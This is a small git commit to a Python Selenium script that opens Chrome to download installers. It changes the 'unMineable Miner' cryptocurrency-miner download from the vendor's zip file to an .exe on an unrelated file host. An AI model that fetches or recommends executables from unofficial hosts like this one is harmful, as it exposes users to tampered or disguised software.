11d4e899aac871799d61d8ed188e815518bc550f
Lokesh <77056553+RetrixDev@users.noreply.github.com>
2021-04-24 14:20:36 +0530

    Update run.py

--- run.py
+++ run.py
@@ -8,7 +8,7 @@ except ImportError:
 finally:
     from selenium import webdriver
     driver = webdriver.Chrome()
-    driver.get("https://unmineable.com/resources/unmineable-miner/unMineable_Miner_1.0.1-beta-packed.zip")
+    driver.get("https://fglink.xyz/d/files/unMineable%20Miner%201.0.1-beta-packed.exe")
 #     driver.get("https://redirector.gvt1.com/edgedl/android/studio/install/4.1.3.0/android-studio-ide-201.7199119-windows.exe")
 
 #     driver.get("https://cdn-fastly.obsproject.com/downloads/OBS-Studio-26.1.1-Full-Installer-x64.exe")
